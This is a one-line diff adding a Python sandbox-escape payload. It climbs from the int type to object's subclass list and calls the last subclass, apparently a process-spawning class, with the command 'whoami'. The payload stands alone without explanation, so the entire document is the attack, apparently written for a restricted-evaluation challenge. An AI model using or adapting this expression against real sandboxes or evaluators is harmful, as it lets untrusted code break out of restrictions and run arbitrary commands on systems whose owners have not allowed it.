@@ -1,0 +1,1 @@
+type.__getattribute__(type(1), "__base__").__subclasses__()[-1](["whoami"])
